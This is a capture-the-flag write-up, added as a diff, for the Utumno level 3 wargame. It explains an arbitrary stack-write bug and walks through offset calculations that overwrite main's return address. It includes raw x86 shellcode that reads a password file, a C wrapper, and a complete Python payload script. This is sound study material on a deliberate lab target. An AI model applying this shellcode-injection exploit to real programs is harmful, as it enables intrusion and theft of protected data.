@@ -1,0 +1,226 @@
+Interesting level, and definitely requires a bit more thought than the previous 3 to solve.
+
+Running /utumno/utumno3, it seems to gather input 23 times before stopping.
+
+Busting out binary ninja's decompiler and looking at the binary file, we find this:
+
+	  utumno3->main (decompiled and heavily edited)
+	┌────────────────────────────────────────────┐
+	│ int i = 0                                  │
+	│ void mystery, mystery2                     │
+	│ while (true)                               │
+	│     char userIn = getchar()                │
+	│     if (userIn == EOF || i > 23)           │
+	│         break                              │
+	│     mystery[i] = userIn ^ (3*i)            │
+	│     *(&mystery2 + mystery[i]) = getchar()  │
+	│     i++                                    │
+	│ return 0                                   │
+	└────────────────────────────────────────────┘
+
+Quite a strange chunk of code. Lets break it down.
+
+The main loop runs at 23 times, getting a character and breaking if getchar() reaches end of file.
+Inside, mystery[i] is assigned to the read in character xor'd with 3*i.
+
+mystery[i] now contains a byte that determines an offset from ebp-0x24 where the NEXT character read is written.
+
+This loop continues up to 23 times, writing data into various locations based off of the input from stdin, before quitting.
+
+Since we have a way to control the location data is being written to (first getchar()'s xor'd byte), and a way to write data (2nd getchar),
+we can effectively alter and overwrite the return address of main to point to shellcode.
+
+It's a bit unclear just looking at the decompiled code above just where exactly mystery2 is in memory.
+
+Looking at the disassembled code:
+
+	    utumno3->main (disassembled, edited)
+	┌────────────────────────────────────────────┐
+	│        ┌─> mov eax, dword [var_ch]         │ ; begin loop
+	│        ╎   ...                             │ 
+        │        ╎   movsx ebx, al                   │ ; ebx now contains xor'd byte from mystery[i] (which was stored in eax)
+	│        ╎   call sym.imp.getchar            │ ; getchar() stores data to write in eax
+	│        ╎   mov byte [ebp + ebx - 0x24], al │ ; assign mystery2[mystery[i]]! it is stored at ebp - 0x24 + mystery[i] (ebx)
+	│        ╎   add dword [var_8h], 1           │ ; increment i
+	│        ╎   call sym.imp.getchar            │ ; 
+	│        ╎   mov dword [var_ch], eax         │ 
+	│        ╎   cmp dword [var_ch], 0xffffffff  │ ; break if getchar == EOF
+	│       ┌──< je 0x8048461                    │ 
+	│       │╎   cmp dword [var_8h], 0x17        │ ; break if i > 23
+	│       │└─< jle 0x8048401                   │
+	│       └──> mov eax, 0                      │
+	│            add esp, 0x38                   │
+	│            pop ebx                         │
+	│            pop ebp                         │
+	│            ret                             │ ; return to hopefullly overwritten address
+	└────────────────────────────────────────────┘
+
+
+Its a bit clearer with the full view of disassembly, but to be concise I cut the larger chunk out where it xor's the first getchar byte with 3*i.
+
+Looking at it though, we can see that mystery2's location where the byte will be written to is actually at ebp - 0x24, plus the offset of mystery[i].
+
+So what this means for us - we need to find several things to calculate the bytes that will overwrite the return address to what we want:
+
+	1. The location in memory of the return address
+	2. The location in the stack of our shellcode
+	3. The value of ebp during the main loop
+
+To keep addresses in the stack consistent, I will use a wrapper c file to execute utumno 3 as always.
+
+The shellcode I will use was written by 'certaindeath', taken from http://shell-storm.org/shellcode/files/shellcode-73.php
+For reasons I need to look into, my and other '/bin/sh' shellcode would execute, but some 'Inappropriate ioctl' error would always come up, so
+I chose to read the utumno4 password file directly instead of getting a shell.
+
+
+				u3wrapper.c
+	┌──────────────────────────────────────────────────────────┐
+	│#include <unistd.h>                                       │
+	│                                                          │
+	│int main(void) {                                          │
+	│    //Shellcode to read /etc/utumno_pass/utumno4          │
+	│    char *environment[2] = {"SHELLCODE="                  │
+	│           "\x31\xc0\x31\xdb\x31\xc9\x31\xd2"             │
+	│      	     "\xeb\x32\x5b\xb0\x05\x31\xc9\xcd"            │
+	│            "\x80\x89\xc6\xeb\x06\xb0\x01\x31"            │
+	│            "\xdb\xcd\x80\x89\xf3\xb0\x03\x83"            │
+	│            "\xec\x01\x8d\x0c\x24\xb2\x01\xcd"            │
+	│            "\x80\x31\xdb\x39\xc3\x74\xe6\xb0"            │
+	│            "\x04\xb3\x01\xb2\x01\xcd\x80\x83"            │
+	│            "\xc4\x01\xeb\xdf\xe8\xc9\xff\xff"            │
+	│            "\xff"                                        │
+	│            "/etc/utumno_pass/utumno4", 0};               │
+	│                                                          │
+	│    char *argv[2] = {"/utumno/utumno3", 0};               │
+	│    execve("/utumno/utumno3", argv, environment);         │
+	│}                                                         │
+	└──────────────────────────────────────────────────────────┘
+
+Running the wrapper in gdb with a test input of 23 "A's", we find the value of:
+
+EBP - 0xffffddf8 
+Location in stack of ret address - 0xffffddfc
+
+And in the stack, the location of the shellcode. 
+
+Stack:
+0xffffdf84 ◂— 0x4c454853 ('SHEL')
+0xffffdf88 ◂— 0x444f434c ('LCOD')
+0xffffdf8c ◂— 0xc031|3d45 ('E='..)
+
+0xffffdf8c contains the first 2 bytes, and E=, so we add 2 to ignore the 'SHELLCOD[E=]' E= bytes. 
+0xffffdf8c+0x2 = 0xffffdf8e.
+
+All together:
+
+EBP=0xffffddf8 
+RET=0xffffddfc 
+SHL=0xffffdf8e
+With those values, calculating the offsets by hand is possible.  
+Ideally, we want to override the location stored for ret with the shellcode address, 0xffffdf8e.
+
+Lets try to overwrite the first byte with the letter A.
+
+We know the byte we pass in will be xor'd with 3*i, (0 for the first byte).
+That means the first byte getchar reads will be the offset from EBP-0x24.
+To get the right EBX value, we just do some simple math:
+What we want to solve for is EBX:
+RET=EBP+EBX-0x24
+So rearrange and find EBX using RET-EBP+0x24.
+RET-EBP+0x24=EBX
+
+To overwrite the first location with 41, 0xffffddfc-0xffffddf8+0x24=0x28. 
+So there is the first character value we need to have read in.
+Next is the data, 0x41.
+
+Running the program with 0x2841 as the input, when execution of main reaches the return statement...
+
+---------------------------------------------------------------------
+0xffffddfc —▸ 0xf7e2a241 (__libc_start_main+177) ◂— call   0xf7e3db50
+----------------------^----------------------------------------------
+                      ^
+Tada! 0x41 was written to the location of the return statement!
+
+To get the next value, we calculate RET-EBP+i+0x24 ^ (3*i)
+The +i is to shift the next written byte down by one location.
+Before the xor, this value is an offset of 0x29, and xor'd it becomes 0x2a.
+
+Repeating this 2 more times I came up with the bytes 28 2a 2c 22 as the positional offset bytes, 
+and then 8e df ff ff as the bytes to write in those positions.
+
+By alternating the positional bytes with the data bytes, the complete byte string '0x288e2adf2cff22ff' is made.
+Passing that in as the input will make utumno3 return to the shellcode!
+
+Of course, calculating these offsets by hand is very tedious, and stack addresses can change. I decided to write
+a python script that works as a wrapper and payload combined.
+
+
+					u3payload.py
+	┌─────────────────────────────────────────────────────────────────────────────────────┐
+	│#!/usr/bin/python3                                                                   │
+	│import os                                                                            │
+	│                                                                                     │
+	│# Address to write to and return address to write determined by using a wrapper in C,│
+	│# and debugging with GDB                                                             │
+	│writeAddress = 0xffffde2c           # Location of return address of main             │
+	│returnTo = [0x8e, 0xdf, 0xff, 0xff] # Location to return to (shellcode in stack)     │
+	│ebp = 0xffffde28                    # Location of ebp, used for offsets              │
+	│originalEBX = []                                                                     │
+	│xorEBX = []                         # List containing XOR'd necessary ebx values     │
+	│payloadBytes = ''                                                                    │
+	│                                                                                     │
+	│print("----------------------------------")                                          │
+	│print("Desired Ret Address: " + hex(returnTo[3]) + hex(returnTo[2])[2:] + \          │
+	│        hex(returnTo[1])[2:] + hex(returnTo[0])[2:])                                 │
+	│for i in range(0,4):                                                                 │
+	│    # Calculate and append necessary ebx values to write to the desired address      │
+	│    originalEBX.append(hex(writeAddress+0x24-ebp+(i))[2:])                           │
+	│    xorEBX.append(hex((writeAddress+0x24-ebp+(i)) ^ (3*i))[2:])                      │
+	│    # Add calculated bytes to the complete payload byte-string                       │
+	│    payloadBytes += xorEBX[i] + hex(returnTo[i])[2:]                                 │
+	│                                                                                     │
+	│print("Original EBX Bytes: ", end="")                                                │
+	│for i in range(0,4):                                                                 │
+	│    print(originalEBX[i], end=" ")                                                   │
+	│print("\nXOR'd EBX Bytes:    ", end="")                                              │
+	│for i in range(0,4):                                                                 │
+	│    print(xorEBX[i], end=" ")                                                        │
+	│print("\nComplete Payload: " + payloadBytes)                                         │
+	│print("----------------------------------")                                          │
+	│print("\nCreating payload file\n...")                                                │
+	│                                                                                     │
+	│# Create temporary payload file and write the payload to it                          │
+	│inFile = open('./payload', 'wb')                                                     │
+	│inFile.write(bytes.fromhex(payloadBytes))                                            │
+	│inFile.close()                                                                       │
+	│                                                                                     │
+	│print("Wrote to payload file bytes '", end="")                                       │
+	│for i in range(0, len(payloadBytes)-2):                                              │
+	│        print(payloadBytes[i:i+2], end=" ")                                          │
+	│print("'\nExecuting utumno3 with payload\n...\nUtumno 4 Password: ", end="")         │
+	│                                                                                     │
+	│# Redirect stdin to new payload file for utumno3 to read from                        │
+	│fd = os.open("./payload", os.O_RDONLY)                                               │
+	│os.dup2(fd, 0)                                                                       │
+	│os.close(fd)                                                                         │
+	│                                                                                     │
+	│# Fork to execute utumno3, then remove the payload after utumno3 finishes execution  │
+	│pid = os.fork()                                                                      │
+	│                                                                                     │
+	│if pid > 0:                                                                          │
+	│    pass                                                                             │
+	│else:                                                                                │
+	│    os.execve("/utumno/utumno3", ['/utumno/utumno3'],\                               │
+	│    {'SHELLCODE':b'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd  │
+	│\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24 │
+	│\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01 │
+	│\xeb\xdf\xe8\xc9\xff\xff\xff/etc/utumno_pass/utumno4'})                              │
+	│                                                                                     │
+	│os.wait()                                                                            │
+	│os.remove("./payload")                                                               │
+	│print("")                                                                            │
+	└─────────────────────────────────────────────────────────────────────────────────────┘
+
+This script uses the logic I explained above to find the correct bytes, write them to a file, and then execute utumno3 with the proper
+shellcode environment and stdin!
+Overall a very cool level and required a lot of thought.
